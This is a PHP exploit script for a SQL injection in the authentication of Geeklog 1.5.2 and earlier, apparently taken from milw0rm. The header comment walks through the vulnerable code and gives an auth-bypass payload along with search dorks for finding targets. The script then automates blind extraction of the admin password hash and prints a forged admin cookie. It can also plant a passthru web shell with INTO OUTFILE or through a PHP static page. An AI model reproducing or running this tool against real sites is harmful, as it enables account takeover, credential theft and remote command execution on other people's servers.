@@ -1,0 +1,459 @@
+<?php
+
+
+/*
+    Geeklog <=1.5.2 SEC_authenticate()/PHP_AUTH_USER sql injection exploit
+    by Nine:Situations:Group::bookoo
+
+    our site: http://retrogod.altervista.org/
+    software site: http://www.geeklog.net/
+
+    credit goes to rgod, bug found more than a year ago
+
+    working against PHP >= 5.0
+    google dorks: "By Geeklog" "Created this page in" +seconds +powered
+                  "By Geeklog" "Created this page in" +seconds +powered inurl:public_html
+
+    vulnerability, see /public_html/webservices/atom/index.php near lines 34-53:
+    ...
+    require_once '../../lib-common.php';
+
+    if (PHP_VERSION < 5) {
+    $_CONF['disable_webservices'] = true;
+    } else {
+        require_once $_CONF['path_system'] . '/lib-webservices.php';
+    }
+    if ($_CONF['disable_webservices']) {
+        COM_displayMessageAndAbort($LANG_404[3], '', 404, 'Not Found');
+    }
+    header('Content-type: ' . 'application/atom+xml' . '; charset=UTF-8');
+    WS_authenticate();
+    ...
+
+    now WS_authenticate() function in /system/lib-webservices.php near lines 780-877:
+
+    ...
+    function WS_authenticate()
+    {
+    global $_CONF, $_TABLES, $_USER, $_GROUPS, $_RIGHTS, $WS_VERBOSE;
+
+    $uid = '';
+    $username = '';
+    $password = '';
+
+    $status = -1;
+
+    if (isset($_SERVER['PHP_AUTH_USER'])) {
+        $username = $_SERVER['PHP_AUTH_USER'];
+        $password = $_SERVER['PHP_AUTH_PW'];
+
+        if ($WS_VERBOSE) {
+            COM_errorLog("WS: Attempting to log in user '$username'");
+        }
+    } elseif (!empty($_SERVER['REMOTE_USER'])) {
+
+
+        list($auth_type, $auth_data) = explode(' ', $_SERVER['REMOTE_USER']);
+        list($username, $password) = explode(':', base64_decode($auth_data));
+
+        if ($WS_VERBOSE) {
+            COM_errorLog("WS: Attempting to log in user '$username' (via \$_SERVER['REMOTE_USER'])");
+        }
+    } else {
+        if ($WS_VERBOSE) {
+            COM_errorLog("WS: No login given");
+        }
+
+
+    }
+
+    ...
+
+    and after, near lines 907-909:
+
+    ...
+     if (($status == -1) && $_CONF['user_login_method']['standard']) {
+            $status = SEC_authenticate($username, $password, $uid);
+        }
+
+    ...
+	
+	
+    now open /system/lib-security.php near lines 695-717:
+
+    ...
+	function SEC_authenticate($username, $password, &$uid)
+    {
+    global $_CONF, $_TABLES, $LANG01;
+
+    $result = DB_query("SELECT status, passwd, email, uid FROM {$_TABLES['users']} WHERE username='$username' AND ((remoteservice is null) or (remoteservice = ''))"); //<------------------- SQL INJECTION HERE
+    $tmp = DB_error();
+    $nrows = DB_numRows($result);
+
+    if (($tmp == 0) && ($nrows == 1)) {
+        $U = DB_fetchArray($result);
+        $uid = $U['uid'];
+        if ($U['status'] == USER_ACCOUNT_DISABLED) {
+            // banned, jump to here to save an md5 calc.
+            return USER_ACCOUNT_DISABLED;
+        } elseif ($U['passwd'] != SEC_encryptPassword($password)) {
+
+            return -1; // failed login
+        } elseif ($U['status'] == USER_ACCOUNT_AWAITING_APPROVAL) {
+            return USER_ACCOUNT_AWAITING_APPROVAL;
+        } elseif ($U['status'] == USER_ACCOUNT_AWAITING_ACTIVATION) {
+            // Awaiting user activation, activate:
+            DB_change($_TABLES['users'], 'status', USER_ACCOUNT_ACTIVE,
+                      'username', $username);
+            return USER_ACCOUNT_ACTIVE;
+        } else {
+            return $U['status']; // just return their status
+        }
+    } else {
+        $tmp = $LANG01[32] . ": '" . $username . "'";
+        COM_errorLog($tmp, 1);
+        return -1;
+    }
+    }
+
+    ...
+
+    you can inject sql code in the 'username' argument of this function, it may
+    come from $_SERVER['PHP_AUTH_USER'] or $_SERVER['REMOTE_USER'] php
+    variables.
+    Theese vars are used for both HTTP Basic and Digest Authentication methods,
+    see PHP manual:
+
+    http://www.php.net/manual/en/features.http-auth.php
+
+    manual poc, visit http://host/path_to_geeklog/webservices/atom/index.php
+    then type:
+
+    username: ' AND 0 UNION SELECT 3,MD5('AAAA'),null,2 FROM gl_users LIMIT 1/*
+    password: AAAA
+
+    authentication mechanism is bypassed!
+    Note that it is passed base64_encode()'d !
+	
+    Now you have access to some dangerous functions:
+
+    service_submit_staticpages()
+    service_delete_staticpages()
+    service_get_staticpages()
+    service_getTopicList_staticpages()
+
+    in /plugins/staticpages/services.inc.php
+
+    service_submit_story()
+    service_delete_story()
+    service_get_story()
+    service_getTopicList_story()
+	
+    in /system/lib-story.php
+	
+    ex. the service_submit_staticpages() one allows to specify a dangerous
+    sp_php flag in submitting "staticpages"; if the staticapages.PHP permission
+    is set to true for the staticpage admin (not the default), the page will be
+    evaluated as PHP code.	
+	
+    If not, you can extract the admin hash, then have access to administration
+    panel by the cookie:
+	
+    geeklog=[uid]; password=[md5 hash];
+	
+    set the staticpages.PHP permission to true, then resubmit the 'staticpage'.
+	
+    Additional notes: Speed time limit is evaded by this script in submitting
+    login credentials/semi-blind queries.
+    If private folders are placed inside the www path (ex. when then public_html
+    path is visible inside urls) you could see the geeklog error.log with sql
+    errors, so disclose the table prefix, if not the default; ex, truncate the
+    url, replacing public_html/ with logs/error.log and you coukd also disclose
+    the local path by visiting ex. http://host/path/system/pear/Archive/Tar.php
+    http://host/path/system/classes/syndication/parserfactory.class.php
+*/
+     
+     
+    $err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+     
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+            nil;
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+            nil;
+        }
+    }
+     
+    function syntax() {
+        print (
+        "Syntax: php ".$argv[0]." [host] [path] [OPTIONS] \n". "Options:                                                                    \n". "--port:[port]         - specify a port                                      \n". "                        default->80                                         \n". "--prefix              - try to extract table prefix from information.schema \n". "                        default->gl_                                        \n". "--uid:[n]             - specify an uid other than default (2,usually admin) \n". "--proxy:[host:port]   - use proxy                                           \n". "--skiptest            - skip preliminary tests                              \n". "--test                - run only tests                                      \n". "--export_shell:[path] - try to export a shell with INTO OUTFILE, needs Mysql\n". "                        FILE privilege                                      \n". "--sp                  - submit a 'staticpage' with php code, needs geeklog  \n". "                        sp_php permission set to true for thestaticpage     \n". "                        plugin (not the default)                            \n". "Examples:   php ".$argv[0]." 192.168.0.1 /geeklog/                          \n". "            php ".$argv[0]." 192.168.0.1 /  --prefix --proxy:1.1.1.1:8080   \n". "            php ".$argv[0]." 192.168.0.1 /  --prefix --export_shell:/var/www\n". "            php ".$argv[0]." 192.168.0.1 /  --prefix --uid:3");
+        die();
+    }
+     
+    error_reporting(E_ALL ^ E_NOTICE);
+    $host = $argv[1];
+    $path = $argv[2];
+     
+    $prefix = "gl_";
+    //default
+    $uid = "2";
+    $where = "uid=$uid";
+     
+     
+    $argv[2] ? print("[*] Attacking...\n") :
+     syntax();
+     
+    $_f_prefix = false;
+    $_use_proxy = false;
+    $port = 80;
+    $_skiptest = false;
+    $_verbose = false;
+    $_test = false;
+    $sp_submit = false;
+    $into_outfile = false;
+     
+    for ($i = 3; $i < $argc; $i++) {
+        if (stristr($argv[$i], "--prefix")) {
+            $_f_prefix = true;
+        }
+        if (stristr($argv[$i], "--proxy:")) {
+            $_use_proxy = true;
+            $tmp = explode(":", $argv[$i]);
+            $proxy_host = $tmp[1];
+            $proxy_port = (int)$tmp[2];
+        }
+        if (stristr($argv[$i], "--port:")) {
+            $tmp = explode(":", $argv[$i]);
+            $port = (int)$tmp[1];
+        }
+         
+        if (stristr($argv[$i], "--uid")) {
+            $tmp = explode(":", $argv[$i]);
+            $uid = (int)$tmp[1];
+            $where = "uid=$uid";
+        }
+        if (stristr($argv[$i], "--verbose")) {
+            $_verbose = true;
+        }
+        if (stristr($argv[$i], "--skiptest")) {
+            $_skiptest = true;
+        }
+        if (stristr($argv[$i], "--test")) {
+            $_test = true;
+        }
+        if (stristr($argv[$i], "--export_shell:")) {
+            $tmp = explode(":", $argv[$i]);
+            $my_path = $tmp[1];
+            $into_outfile = true;
+        }
+        if (stristr($argv[$i], "--sp")) {
+            $sp_submit = true;
+        }
+    }
+     
+    function _s($url, $auth, $is_post, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request."\r\n");
+        }
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7");
+        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
+         
+        if ($auth <> "") {
+             $auth = array("Authorization: Basic ".$auth);
+            curl_setopt($ch, CURLOPT_HEADER, 1);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $auth);
+        }
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+     
+    function find_prefix() {
+        global $host, $port, $path, $uid, $pwd, $url;
+         
+        $_tn = "TABLE_NAME";
+        $_ift = "information_schema.TABLES";
+         
+        $_table_prefix = "";
+        $j = -15;
+        $usr = "' AND 0 UNION SELECT null,null,null,null FROM $_ift WHERE ".$_tn." LIKE 0x25747261636b6261636b636f646573 LIMIT 1/*";
+        $_o = _s($url, base64_encode($usr.":".$pwd) , 0, "");
+        if (chk_err($_o)) {
+            die("[!] $_ift not availiable.");
+        } else {
+            print "[*] Initiating table prefix extraction...\n";
+        }
+        while (!$null_f) {
+            $mn = 0x00;
+            $mx = 0xff;
+            while (1) {
+                if (($mx + $mn) % 2 == 1) {
+                    $c = round(($mx + $mn) / 2) - 1;
+                } else {
+                    $c = round(($mx + $mn) / 2);
+                }
+                 
+                $usr = "' AND 0 UNION SELECT 3,MD5('AAAA'),null,(CASE WHEN (ASCII(SUBSTR(".$_tn." FROM $j FOR 1)) >= ".$c.") THEN '' ELSE $uid END) FROM $_ift WHERE ".$_tn." LIKE 0x25747261636b6261636b636f646573 LIMIT 1/*";
+                $_o = _s($url, base64_encode($usr.":".$pwd) , 0, "");
+                 
+                if (chk_err($_o)) {
+                    $mn = $c;
+                } else {
+                    $mx = $c - 1;
+                }
+                 
+                if (($mx-$mn == 1) or ($mx == $mn)) {
+                    $usr = "' AND 0 UNION SELECT 3,MD5('AAAA'),null,(CASE WHEN (ASCII(SUBSTR(".$_tn." FROM $j FOR 1)) >= ".$c.") THEN '' ELSE $uid END) FROM $_ift WHERE ".$_tn." LIKE 0x25747261636b6261636b636f646573 LIMIT 1/*";
+                    $_o = _s($url, base64_encode($usr.":".$pwd) , 0, "");
+                    if (chk_err($_o)) {
+                        if ($mn <> 0) {
+                            $_table_prefix = chr($mn).$_table_prefix;
+                        } else {
+                            $null_f = true;
+                        }
+                    } else {
+                        if ($mx <> 0) {
+                            $_table_prefix = chr($mx).$_table_prefix;
+                        } else {
+                            $null_f = true;
+                        }
+                    }
+                    if (!$null_f) {
+                        print ("[?] Table prefix->[??]".$_table_prefix."\n");
+                    }
+                    break;
+                }
+            }
+            $j--;
+        }
+        print "[?] Table prefix->".$_table_prefix."\n";
+        return $_table_prefix;
+    }
+     
+     
+    function export_sh() {
+        global $pwd, $url, $prefix, $my_path;
+        $usr = "' AND 0 UNION SELECT null,'<?php passthru(\$_GET[cmd]);?>',null,null INTO OUTFILE '".$my_path."/sh.php' FROM ".$prefix."users LIMIT 1/*";
+        $_o = _s($url, base64_encode($usr.":".$pwd) , 0, "");
+        if (chk_err($_o)) {
+            print ("[*] Sql error.");
+        } else {
+            print ("[*] Done.");
+        }
+    }
+     
+    function sp_php() {
+        global $host, $port, $path, $pwd, $prefix, $uid;
+         
+        srand(make_seed());
+        $id = rand(0x1, 0xffffff);
+        echo "[*] id->".$id."\n";
+         
+        $sh = "passthru(\$_GET[cmd]);";
+         
+        //always specify the namespaceuri
+        //if the staticpages.PHP permission is not avaliable, sp_php will be resetted to 0
+        $data = "<?xml version=\"1.0\"?>". "<entry>". "<title term=\"1\" xmlns=\"http://www.geeklog.net/xmlns/app/gl\">\x20\x20\x20\x20</title>". "<id xmlns=\"http://www.geeklog.net/xmlns/app/gl\">$id</id>". "<sp_content xmlns=\"http://www.geeklog.net/xmlns/app/gl\">$sh</sp_content>". "<sp_php xmlns=\"http://www.geeklog.net/xmlns/app/gl\">1</sp_php>". "<gl_etag xmlns=\"http://www.geeklog.net/xmlns/app/gl\">1</gl_etag>". "</entry>";
+         
+        $usr = "' AND 0 UNION SELECT 3,MD5('AAAA'),null,$uid FROM ".$prefix."users LIMIT 1/*";
+        $url = "http://$host:$port".$path."webservices/atom/index.php?plugin=staticpages";
+        $out = _s($url, base64_encode($usr.":".$pwd) , 1, $data);
+         
+        if (chk_err($_o)) {
+            print ("[*] Sql error.");
+        } else {
+            print ("[*] Done! Visit->http://$host:$port".$path."staticpages/index.php?page=$id&cmd=ls%20-la");
+        }
+         
+    }
+     
+    function make_seed() {
+        list($usec, $sec) = explode(' ', microtime());
+        return (float) $sec + ((float) $usec * 100000);
+    }
+     
+    function chk_err($s) {
+        if (stripos ($s, "\x41\x6e\x20\x53\x51\x4c\x20\x65\x72\x72\x6f\x72\x20\x68\x61\x73\x20\x6f\x63\x63\x75\x72\x72\x65\x64\x2e")) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+     
+    $pwd = "AAAA";
+    $url = "http://$host:$port".$path."webservices/atom/index.php?plugin=staticpages";
+     
+    if (!$_skiptest) {
+        $out = _s($url, base64_encode("':'") , 0, "");
+        if (chk_err($out)) {
+            print("[*] Vulnerable!\n");
+        } else {
+            die("[!] Not vulnerable.");
+        }
+    }
+     
+    if ($_test) {
+        die;
+    }
+     
+    if ($_f_prefix == true) {
+        $prefix = find_prefix();
+    }
+     
+    if ($into_outfile == true) {
+        export_sh();
+        die;
+    }
+    if ($sp_submit == true) {
+        sp_php();
+        die;
+    }
+     
+    $c = array();
+    $c = array_merge($c, range(0x30, 0x39));
+    $c = array_merge($c, range(0x61, 0x66));
+    $_hash = "";
+    print ("[*] Initiating hash extraction ...\n");
+    for ($j = 1; $j < 0x21; $j++) {
+        for ($i = 0; $i <= 0xff; $i++) {
+            $f = false;
+            if (in_array($i, $c)) {
+                //uid is mediumint, so if you assign a string value to it you have an sql error, so the script fails hence true/fails questions and you bypass speed limit also
+                $usr = "' AND 0 UNION SELECT 3,MD5('AAAA'),null,(CASE WHEN (ASCII(SUBSTR(passwd FROM $j FOR 1))=$i) THEN '' ELSE $uid END) FROM ".$prefix."users WHERE $where LIMIT 1/*";
+                $out = _s($url, base64_encode($usr.":".$pwd) , 0, "");
+                if (chk_err($out)) {
+                    $f = true;
+                    $_hash .= chr($i);
+                    print "[*] Md5 Hash: ".$_hash.str_repeat("?", 0x20-$j)."\n";
+                    break;
+                }
+            }
+        }
+        if ($f == false) {
+            die("\n[!] Unknown error ...");
+        }
+    }
+    print "[*] Done! Cookie: geeklog=$uid; password=".$_hash.";\n";
+?>
+
+# milw0rm.com [2009-04-09]
